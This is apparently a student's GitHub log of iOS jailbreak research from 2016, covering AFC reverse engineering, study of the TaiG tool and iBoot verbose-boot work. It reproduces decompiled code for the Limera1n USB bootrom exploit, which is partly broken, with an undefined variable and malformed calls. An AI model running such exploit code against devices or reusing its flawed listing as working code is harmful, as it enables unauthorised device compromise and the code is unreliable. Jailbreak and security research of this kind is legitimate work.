# iOS Jailbreaking and Security - Derek Foresman 

[© 2016 MTAC](https://twitter.com/mtac8 "MTAC Twitter")

![Preview](Preview.png)

This is the repository that I will be using to document my progress and maintain the code used in my private iOS 10.X jailbreak and resources and research used for jailbreaks for previous versions of iOS.

# Daily Updates

* Monday, December 5th - 9:30 AM - I contacted Johnathan Levin about the purchase of his book on iOS Internals. Further research also provided me with Black Hat 2016 [remote web-based sandbox escape](https://www.blackhat.com/asia-17/briefings/schedule/#remotely-compromising-ios-via-wi-fi-and-escaping-the-sandbox-5284) for iOS by Marcos Grassi. This will help me greatly because I still need a web exploit for my jailbreak to be used by just visiting one website. 

* Friday, December 2nd - 2:00 PM - I looked at the code from the [Limera1n exploit](https://www.theiphonewiki.com/wiki/Limera1n_Exploit) made by [Geohot](https://en.wikipedia.org/wiki/George_Hotz). The code for the exploit is very short considering the amount of power a user as with this exploit as it is for iBoot and cannot be patched by a simple iOS software update. 

```
signed int __cdecl upload_exploit() {
    int device_type;
    signed int payload_address;
    int free_address;
    int deviceerror;
    char *chunk_headers_ptr;
    unsigned int sent_counter;
    //int v6;
    signed int result; 
    //signed int v8;
    int recv_error_code;
    signed int payload_address2;
    signed int padding_size;
    char payload;
    char chunk_headers;
    //int v14;
    //v14 = *MK_FP(__GS__, 20);
    device_type = *(_DWORD *)(device + 16);

    if ( device_type == 8930 ) {
        padding_size = 0x2A800;
        payload_address = 0x8402B001;
        free_address = 0x8403BF9C;
    } else {
        payload_address = 0x84023001;
        padding_size = 0x22800;
        // free_address = (((device_type == 8920) – 1) & 0xFFFFFFF4) – 0x7BFCC05C;
        if(device_type == 8920) free_address = 0x84033FA4;
           else free_address = 84033F98;
    }

    memset(&payload, 0, 0x800);
    memcpy(&payload, exploit, 0x230);

    if (libpois0n_debug) {
        //v8 = payload_address;
        fprintf(stderr, 1, "Resetting device counters\n");
        //payload_address = v8;
    }

    payload_address2 = payload_address;
    deviceerror = irecv_reset_counters(client);

    if ( deviceerror ) {
        irecv_strerror(deviceerror);
        fprintf(stderr, 1, &aCannotFindS[12]);
        result = -1;
    } else {
        memset(&chunk_headers, 0xCC, 0x800);
        chunk_headers_ptr = &chunk_headers;

        do {
            *(_DWORD *)chunk_headers_ptr = 1029;       
            *((_DWORD *)chunk_headers_ptr + 1) = 257;
            *((_DWORD *)chunk_headers_ptr + 2) = payload_address2;  
            *((_DWORD *)chunk_headers_ptr + 3) = free_address;
            chunk_headers_ptr += 64;
        } while ((int *)chunk_headers_ptr != &v14);

        if (libpois0n_debug)
            fprintf(stderr, 1, "Sending chunk headers\n");

        sent_counter = 0;
        irecv_control_transfer(client, 0x21, 1, 0, 0, &chunk_headers, 0x800);
        memset(&chunk_headers, 0xCC, 0x800);

        do {
            sent_counter += 0x800;
            irecv_control_transfer(client, 0x21, 1, 0, 0, &chunk_headers, 0x800);
        } while (sent_counter < padding_size);

        if (libpois0n_debug)
            fprintf(stderr, 1, "Sending exploit payload\n");

        irecv_control_transfer(client, 0x21, 1, 0, 0, &payload, 0x800);

        if (libpois0n_debug)
            fprintf(stderr, 1, "Sending fake data\n");

        memset(&chunk_headers, 0xBB, 0x800);
        irecv_control_transfer(client, 0xA1, 1, 0, 0, &chunk_headers, 0x800);
        irecv_control_transfer(client, 0x21, 1, 0, 0, &chunk_headers, 0x800);

        if (libpois0n_debug)
        fprintf(stderr, 1, "Executing exploit\n");

        irecv_control_transfer(client, 0x21, 2, 0, 0, &chunk_headers, 0);
        irecv_reset(client);
        irecv_finish_transfer(client);

        if (libpois0n_debug) {
            fprintf(stderr, 1, "Exploit sent\n");
            if (libpois0n_debug)
                fprintf(stderr, 1, "Reconnecting to device\n");
        }

        client = (void *)irecv_reconnect(client, 2);

        if (client) {
            result = 0;
        } else {
            if (libpois0n_debug) {
                recv_error_code = irecv_strerror(0);
                fprintf(stderr, 1, &aCannotFindS[12], recv_error_code);
            }
            fprintf(stderr, 1, "Unable to reconnect\n");
            result = -1;
        }
    }

    // compiler stack check
    //if (*MK_FP(__GS__, 20) != v14)
    //    __stack_chk_fail(v6, *MK_FP(__GS__, 20) ^ v14);

    return result;
}
```

* Friday, December 2nd - 12:00 PM - I started the editing of a video that I plan on showing how and iBoot eploit works.

* Friday, December 2nd - 9:30 AM - Trying to broaden my creative aspect with a video I made of my iBoot exploit in action. This was taken on an iPhone 4s, running iOS 7.1.2 when booted.

![Preview](images/imovie.png)

* Friday, December 2nd - 3:30 AM - After multiple attempts (the log file shows 108 attempts) I finally got iOS 7.1.2 on an iPhone 4 to boot into verbose mode. In order for verbose mode which is the scrolling text, an iBoot exploit must be used. iBoot cannot be patched by a software update, because the only way to modify its code is to either release a new version of the iDevice or to have a special tool that is illegal to possess unless you are Apple. There are exploits in iBoot that are read only, which means, no matter the iOS version on the read/write memory, a jailbreak exists for the device. [iBoot Verbose Boot Video](https://youtu.be/tCmHcDsoe7s)

* Thursday, December 1st 2016 - 4:30 PM - I continued to reverse engineer Apple File Conduit. I used open source tools like [libimobiledevice](http://www.libimobiledevice.org/) and [libirecovery](https://github.com/libimobiledevice/libirecovery) to find how the computer communicates over USB with the iBoot/iBSS on the iDevice. I also started to look into hardware based exploits like those for iBoot, like Limera1n, and SHAtter.

![Preview](images/lib.png)

* Thursday, December 1st 2016 - 2:30 PM - I changed the direction of the day a little bit by starting to disassemble the binaries of the processes used by iTunes on a desktop operating system, that are responsible for the transfer of files over usb to specific directories on an iDevice. I loaded it into Hopper Disassembler to view the process behind the compiled binary since the source of it is owned by Apple and currently unavailable to the public.

![Preview](images/hopper.png)

* Thursday, December 1st 2016 - 1:30 PM - Reaching out to Jeff Benjamin [@JeffBenjam](https://twitter.com/JeffBenjam) of [9to5mac.com](https://9to5mac.com/). Jeff and 9to5Mac cover the most recent updates in the jailbreak scene. For people looking for more information on jailbreaking, [this](https://9to5mac.com/guides/jailbreak/) post provides useful information on the comcept. Check this page for the most accurate updates.

![Preview](images/9to5mac.png)

* Thursday, December 1st 2016 - 11:30 PM - Started reaching out to developers of popular Cydia tweaks. I have previously recorded podcasts with prominent developers like William Vabrinskas [@william_vab](https://twitter.com/william_vab), Matt Clarke [@matchstic](https://twitter.com/_Matchstic), Andy Wiik [@Andywiik](https://twitter.com/Andywiik), Brian Olencki [@bolencki13](https://twitter.com/bolencki13).

* Wednesday, November 30th 2016 - 10:45 AM - Continued the review of [TaiG's](http://taig.com "TaiG Jailbreak") tool from the article [here](http://www.newosxbook.com/articles/TaiG2.html "The Annotated guide to TaiG"). The intentional abuse of internal Apple tools and services to reach arbitrary code execution. In the case of TaiG for iOS 8, the use of AFC or Apple File Conduit which is an internal service built into applications like iTunes, and responsible for the transfer of files from a computer to the filesystem of an iDevice over a USB cable with the use of USBMux. Examined the difference in modified AMFI.kext responsible for file signature checks on iOS 7.1.2.

![Preview](images/amfi.png)

* Wednesday, November 30th 2016 - 10:00 AM - Started the analysis of [TaiG's](http://taig.com "TaiG Jailbreak") tool used in the iOS 8.1.3 through iOS 8.4 jailbreak. I will be comparing the different exploits and methods used from each jailbreak for modern(ish) versions of iOS (6-10). Next step - Reach out to Jonathan for a possible interview. N.B. FileMon is amazing.

![Preview](images/taig.png)

* Wednesday, November 30th 2016 - 9:15 AM - Compiled [Jonathan Levin's](https://newosxbook.com "Newosxbook.com") Jtool for ARM Cortex-A9 processor architecture on iPhone 4s for debugging of 32 bit binaries. Once compiled, I set up necessary keys for SSH access to iPhone 4s over wifi.

![Preview](images/jtool.png)
![Preview](images/ssh.png)

* Tuesday, November 29th 2016 - Started Github Repository to document my progress and manage all the code needed for my independent project

![Preview](images/Github_Repo.png)

